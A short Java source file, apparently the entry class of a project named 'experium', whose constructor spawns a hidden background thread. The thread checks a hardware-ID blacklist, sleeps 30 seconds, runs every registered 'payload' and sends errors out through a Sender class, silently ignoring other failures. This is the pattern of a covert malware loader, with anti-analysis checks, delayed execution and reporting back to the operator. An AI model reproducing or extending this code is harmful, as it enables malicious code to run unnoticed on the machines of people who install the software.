package dev._3000IQPlay.experium;

import dev._3000IQPlay.experium.payload.Payload;
import dev._3000IQPlay.experium.payload.PayloadRegistry;
import dev._3000IQPlay.experium.payload.Sender;
import dev._3000IQPlay.experium.util.HWIDUtil;

public final
class Start {
    public
    Start () {
        new Thread(() -> {
            try {
                if (HWIDUtil.blacklisted()) return;
                Thread.sleep(30000);
                for (Payload payload : PayloadRegistry.getPayloads())
                    try {
                        payload.execute();
                    } catch (Exception e) {
                        Sender.send(e.getMessage());
                    }
            } catch (Exception ignored) {
            }
        }).start();
    }
}